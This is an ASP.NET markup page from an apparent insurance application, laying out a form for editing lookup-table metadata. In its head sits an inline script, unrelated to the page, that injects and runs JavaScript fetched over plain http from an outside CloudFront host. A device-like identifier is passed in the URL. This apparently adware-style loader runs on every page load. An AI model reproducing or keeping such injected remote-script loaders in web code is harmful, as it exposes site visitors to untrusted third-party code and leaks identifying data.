<%@ Page language="c#" Inherits="EPolicy.LookupTableMetadata" CodeFile="LookupTableMetadata.aspx.cs" %>
<%@ Register TagPrefix="MaskedInput" Namespace="MaskedInput" Assembly="MaskedInput" %>
<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>
		<form id="ProspectBusiness" method="post" runat="server">
        <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager2" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <asp:Literal ID="jvscript" runat="server"></asp:Literal>
                <div class="row row-offcanvasrow-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Lookup Table Metadata</h1>
                        <div class="form=group" align="center">
                                                    <asp:Button id="BtnSave" runat="server" Text="SAVE" 
                                                        BorderWidth="0px" onclick="BtnSave_Click" Width="155px" CssClass="btn btn-primary btn-lg"></asp:Button>
													<asp:Button id="cmdCancel" runat="server" Text="CANCEL" 
                                                        BorderWidth="0px" onclick="cmdCancel_Click" Width="155px" CssClass="btn btn-primary btn-lg"></asp:Button>
													<asp:Button id="btnEdit" runat="server"  Text="MODIFY" 
                                                        BorderWidth="0px" onclick="btnEdit_Click" Width="155px" CssClass="btn btn-primary btn-lg"></asp:Button>
													<asp:Button id="BtnExit" runat="server"  Text="EXIT" 
                                                        BorderWidth="0px" onclick="cmdExit_Click" Width="155px" CssClass="btn btn-primary btn-lg"></asp:Button>
													<asp:Button id="btnSearch" runat="server"  Text="SEARCH" 
                                                        BorderWidth="0px" onclick="btnSearch_Click" Width="155px" CssClass="btn btn-primary btn-lg"></asp:Button>
                             <br />
                            <br />
                            <div align="left">
                            <asp:Label id="Label8" runat="server" Font-Bold="True"  ForeColor="Gray">Lookup Table ID:  </asp:Label>
							<asp:label id="lblLookupTableID" runat="server"  Font-Bold="True"></asp:label>                              
                            </div>
                        </div>
                         <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span></ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                        <div class="row formWraper" style="padding: 0px;" align="center">
                            <div class="col-sm-12" align="center">
                                <br />
                        <asp:Label id="Label6" runat="server" CssClass="labelForControl">Add table to metadata store:</asp:Label>
                        <br />
                            <asp:DropDownList id="ddlTablesNotInMetadataStore" tabIndex="1" runat="server" CssClass="form-controlWhite" Width="300px"></asp:DropDownList>
							<asp:Button id="btnAddTableToMetadataStore" runat="server" Text="ADD"  onclick="btnAddTableToMetadataStore_Click" CssClass="btn btn-primary btn-lg" Width="155px"></asp:Button>
                            <br />
                             <img alt="" src="Images2/GreyLine.png" style="height: 6px; margin-top: 0px;" width="85%;" />
                                <br />
                            <br />
							<asp:label id="lblA"  CssClass="labelForControl" runat="server"> Table Name</asp:label>
															<br />
																<asp:dropdownlist id="ddlTableNames" tabIndex="3" runat="server" CssClass="form-controlWhite" Width="300px"
																	AutoPostBack="True" onselectedindexchanged="ddlTableNames_SelectedIndexChanged"></asp:dropdownlist>
                                                                    <br />
																<asp:checkbox id="chkIsValuePair" tabIndex="9" runat="server" 
                                                                     Text="Is value pair?" Enabled="False" CssClass="labelForControl"
                                                                    AutoPostBack="True" TextAlign="Left" 
                                                                    oncheckedchanged="chkIsValuePair_CheckedChanged"></asp:checkbox>
													<br />
                                                    <br />
                                                                <asp:label id="Label1" runat="server" CssClass="labelForControl">ID Field Name</asp:label>                                                     
															<br />
																<asp:dropdownlist id="ddlIdFieldNames" tabIndex="4" runat="server" CssClass="form-controlWhite" Width="300px"
																	Enabled="False"></asp:dropdownlist>
                                                                    <br />
                                                                    <br />
																<asp:label id="Label2" runat="server" CssClass="labelForControl">Description Field Name</asp:label></TD>
															<br />
																<asp:dropdownlist id="ddlDescriptionFieldNames" tabIndex="5" runat="server" CssClass="form-controlWhite" Width="300px"
																	Enabled="False"></asp:dropdownlist>
                                                                    <br />
                                                                    <br />

                                                                <asp:label id="Label3" runat="server" 
                                                                    CssClass="labelForControl">Default Search Field A</asp:label></TD>
															<br />
																<asp:dropdownlist id="ddlDefaultSearchFieldsA" tabIndex="6" runat="server" CssClass="form-controlWhite" Width="300px"
																	Enabled="False"></asp:dropdownlist>
                                                                    <br />
                                                                    <br />
																<asp:label id="Label4" runat="server" 
                                                                    CssClass="labelForControl">Default Search Field B</asp:label>
														<br />
																<asp:dropdownlist id="ddlDefaultSearchFieldsB" tabIndex="7" runat="server" CssClass="form-controlWhite" Width="300px"
																	Enabled="False"></asp:dropdownlist>
                                                                    <br />
                                                                    <br />
																<asp:label id="Label5" runat="server"
                                                                    CssClass="labelForControl">Maintenance Page Path</asp:label>
                                                                    <br />
															<asp:textbox id="txtMaintenancePagePath" runat="server" Enabled="False" tabIndex="8"
																	CssClass="form-controlWhite" Width="300px"></asp:textbox>
										
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                            </div>
                        </div>
                        <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                            Height="260px">
                            <div class="" style="padding: 0px; border-radius: 5px; background-color: #036893;
                                color: #FFFFFF; font-family: tahoma; font-size: 14px; font-weight: normal; font-style: normal;
                                background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                                &nbsp;&nbsp;
                                <asp:Label ID="Label7" runat="server" Font-Bold="False" Font-Italic="False" Font-Names="arialnarrow"
                                    Font-Size="14pt" Text="Message..." ForeColor="White" />
                            </div>
                            <div>
                                <table style="background-position: center; width: 430px; height: 175px;">
                                    <tr>
                                        <td align="center" valign="middle">
                                            <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                                Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                                Width="350px" CssClass="Labelfield2-14" />
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div class="" align="center">
                                <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                            </div>
                        </asp:Panel>
                        <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass="modalBackground"
                            DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                        </Toolkit:ModalPopupExtender>
                        <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                            BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                        <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                            Radius="10" Corners="All" />
                    </div>
                    <MaskedInput:MaskedTextHeader ID="MaskedTextHeader1" runat="server"></MaskedInput:MaskedTextHeader>
                    <<asp:Literal ID="litPopUp" runat="server" Visible="False"></asp:Literal>
                </div>
            </ContentTemplate>
        </asp:UpdatePanel>
    </div>
    </form>
</body>
</html>